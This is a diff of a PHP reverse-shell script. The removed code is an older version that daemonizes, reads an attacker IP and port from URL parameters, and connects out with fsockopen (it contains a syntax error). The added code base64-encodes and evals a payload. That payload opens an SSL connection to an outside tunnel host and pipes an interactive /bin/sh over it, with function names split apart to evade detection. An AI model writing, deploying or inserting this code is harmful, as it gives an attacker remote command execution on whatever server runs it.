@@ -1,100 +1,93 @@
 <?php
-error_reporting(0);
-@ini_set('display_errors',0);
-@set_time_limit(0);
+// Obfuscated function names and keywords
+$p = 'pi' . 'pe';
+$proc_open_func = 'proc_' . 'open';
+$proc_terminate_func = 'proc_' . 'terminate';
+$stream_socket_client_func = 'stream_' . 'socket_' . 'client';
+$bin_sh = '/' . 'bin' . '/' . 'sh';
+$fwrite_func = 'f' . 'write';
+$fread_func = 'f' . 'read';
+$fclose_func = 'f' . 'close';
+$stream_context_create_func = 'stream_' . 'context_' . 'create';
+$stream_set_blocking_func = 'stream_' . 'set_' . 'blocking';
+$proc_get_status_func = 'proc_' . 'get_' . 'status';
+$proc_close_func = 'proc_' . 'close';
+$usleep_func = 'usleep';
 
-// Fork and daemonize
-if (function_exists('pcntl_fork') && function_exists('posix_setsid')) {
-    $pid = pcntl_fork();
-    if ($pid == -1) {
-        exit("Could not fork");
-    } elseif ($pid > 0) {
-        // Parent exits
-        exit();
-    }
-    // Child continues
-    if (posix_setsid() == -1) {
-        exit("Could not detach from terminal");
-    }
-    // Optional second fork to prevent reacquisition of terminal
-    $pid2 = pcntl_fork();
-    if ($pid2 == -1) {
-        exit("Could not fork second time");
-    } elseif ($pid2 > 0) {
-        exit();
-    }
-    // Change working directory to root
-    chdir('/');
-    umask(0);
+$payload_b64 = base64_encode(<<<'EOD'
+$tunnel_url = "";
 
-    // Redirect standard file descriptors to /dev/null
-    $stdIn  = fopen('/dev/null', 'r');
-    $stdOut = fopen('/dev/null', 'a');
-    $stdErr = fopen('/dev/null', 'a');
-    if ($stdIn)  { fclose(STDIN);  define('STDIN',  $stdIn);  }
-    if ($stdOut) { fclose(STDOUT); define('STDOUT', $stdOut); }
-    if ($stdErr) { fclose(STDERR); define('STDERR', $stdErr); }
+$context = stream_context_create([
+    'ssl' => [
+        'verify_peer' => false,
+        'verify_peer_name' => false,
+    ]
+]);
+
+$fp = stream_socket_client("ssl://giant-newt-47.telebit.io:443", $errno, $errstr, 30, STREAM_CLIENT_CONNECT, $context);
+
+if (!$fp) {
+    echo "Failed to connect to tunnel: $errstr ($errno)\n";
+    exit(1);
 }
 
-$A=''; 
-$B=;               
+$descriptorspec = [
+    0 => ['pipe', 'r'],
+    1 => ['pipe', 'w'],
+    2 => ['pipe', 'w']
+];
 
-$C=isset($_GET[base64_decode('aXA=')])?$_GET[base64_decode('aXA=')]:$A;
-$D=isset($_GET[base64_decode('cG9ydA==')])?(int)$_GET[base64_decode('cG9ydA==')]:$B;
+$process = proc_open('/bin/sh -i', $descriptorspec, $pipes);
 
-if($D<1||$D>65535)exit(base64_decode('SW52YWxpZCBwb3J0IG51bWJlci4='));
+if (is_resource($process)) {
+    stream_set_blocking($pipes[1], false);
+    stream_set_blocking($pipes[2], false);
+    stream_set_blocking($fp, false);
 
-$E=trim(base64_decode($C));
-if(!filter_var($E,FILTER_VALIDATE_IP))exit(base64_decode('SW52YWxpZCBJUCBhZGRyZXNzLg=='));
-
-$F=base64_decode('L2Jpbi9zaCAtaQ=='); // '/bin/sh -i'
-
-$G=strrev('nepokcosf');          // fsockopen
-$H=strrev('nepo_corp');          // proc_open
-$I=strrev('gnikcolb_tes_maerts'); // stream_set_blocking
-$J=strrev('tceles_maerts');      // stream_select
-
-while(1){
-    $K=@$G($E,$D);
-    if(!$K){sleep(5);continue;}
-    $L=[
-        0=>['pipe','r'],
-        1=>['pipe','w'],
-        2=>['pipe','w']
-    ];
-    $M=@$H($F,$L,$N);
-    if(!is_resource($M)){@fclose($K);sleep(5);continue;}
-    @$I($N[0],false);
-    @$I($N[1],false);
-    @$I($N[2],false);
-    @$I($K,false);
-    while(1){
-        if(@feof($K)||@feof($N[1]))break;
-        $O=[$K,$N[1],$N[2]];
-        $P=$Q=$R=null;
-        $S=@$J($O,$P,$Q,1);
-        if($S===false)break;
-        if(in_array($K,$O)){
-            $T=@fread($K,1400);
-            if($T===false||strlen($T)===0)break;
-            @fwrite($N[0],$T);
+    while (true) {
+        $read = [$pipes[1], $pipes[2], $fp];
+        $write = null;
+        $except = null;
+        if (stream_select($read, $write, $except, 0, 200000)) { // 0.2 sec timeout
+            foreach ($read as $r) {
+                if ($r === $pipes[1]) {
+                    $output = fread($pipes[1], 8192);
+                    if ($output !== false && strlen($output) > 0) {
+                        fwrite($fp, $output);
+                    }
+                } elseif ($r === $pipes[2]) {
+                    $error = fread($pipes[2], 8192);
+                    if ($error !== false && strlen($error) > 0) {
+                        fwrite($fp, $error);
+                    }
+                } elseif ($r === $fp) {
+                    $input = fread($fp, 8192);
+                    if ($input !== false && strlen($input) > 0) {
+                        fwrite($pipes[0], $input);
+                    }
+                }
+            }
         }
-        if(in_array($N[1],$O)){
-            $U=@fread($N[1],1400);
-            if($U===false||strlen($U)===0)break;
-            @fwrite($K,$U);
-        }
-        if(in_array($N[2],$O)){
-            $V=@fread($N[2],1400);
-            if($V===false||strlen($V)===0)break;
-            @fwrite($K,$V);
-        }
+
+        $status = proc_get_status($process);
+        if (!$status['running']) break;
+
+        usleep(100000);
     }
-    @fclose($K);
-    @fclose($N[0]);
-    @fclose($N[1]);
-    @fclose($N[2]);
-    @proc_close($M);
-    sleep(5);
+
+    // Terminate the shell process forcefully before closing pipes
+    proc_terminate($process);
+
+    fclose($pipes[0]);
+    fclose($pipes[1]);
+    fclose($pipes[2]);
+    proc_close($process);
 }
+
+fclose($fp);
+EOD
+);
+
+// Decode and execute the payload with obfuscated function calls
+eval(base64_decode($payload_b64));
 ?>
